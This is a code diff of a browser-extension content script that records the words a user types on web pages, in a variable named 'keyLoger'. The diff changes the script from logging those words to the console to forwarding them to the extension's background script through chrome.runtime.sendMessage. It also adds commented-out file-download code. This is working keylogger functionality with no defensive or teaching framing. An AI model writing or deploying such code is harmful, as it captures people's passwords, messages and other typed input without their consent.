@@ -1,3 +1,24 @@
+/*
+ // (A) CREATE BLOB OBJECT
+  var myBlob = new Blob([imageUri], {type: "text/plain"});
+
+  // (B) CREATE DOWNLOAD LINK
+  var url = window.URL.createObjectURL(myBlob);
+  var anchor = document.createElement("a");
+  anchor.href = url;
+  anchor.download = "demo.txt";
+   
+  // (C) "FORCE DOWNLOAD"
+  // NOTE: MAY NOT ALWAYS WORK DUE TO BROWSER SECURITY
+  // BETTER TO LET USERS CLICK ON THEIR OWN
+  anchor.click();
+  window.URL.revokeObjectURL(url);
+  document.removeChild(anchor);
+
+*/
+
+
+
 let keyLoger = ""
 let array = []
 
@@ -8,33 +29,11 @@ document.addEventListener("keypress", (e) => {
     if (e.key==" " || e.key=="Enter"){
         array.push(keyLoger)
         keyLoger=""
-        console.log("array = ",array )
+        notifyBackgroundPage(array)
+        // console.log("array = ",array )
     }
 })
 
-/*
-// // Création de la fonction AFK puis appel
-let isUserActivity = 0
-
-document.addEventListener("mousemove",() => {
-    
-    isUserActivity=1
-    console.log("CL inactivity mousemove=",isUserActivity)
- 
-})
-
-// setTimeout(function(){
-//     isUserActivity=0
-//     console.log("statut 2=",isUserActivity)
-// },3000)
-
-function inactivity () {
-    isUserActivity=0
-    console.log("CL inactivity =",isUserActivity)
-    setTimeout(inactivity,3000)
-
-}
-inactivity()*/
 let baliseSelect = "span"
 
 let inactivityTime = function () {
@@ -75,4 +74,24 @@ window.onload = function() {
     inactivityTime();
   }
 
+
+// Send message to chrome extention
+  function handleResponse(message) {
+    console.log(`Message from the background script:  ${message.response}`);
+  }
   
+  function handleError(error) {
+    console.log(`Error: ${error}`);
+  }
+  
+  function notifyBackgroundPage(e) {
+    var sending = chrome.runtime.sendMessage({
+      greeting: e
+    //   greeting: "Greeting from the content script"
+    });
+    sending.then(handleResponse, handleError);
+  }
+  
+//   window.addEventListener("click", notifyBackgroundPage);
+ 
+
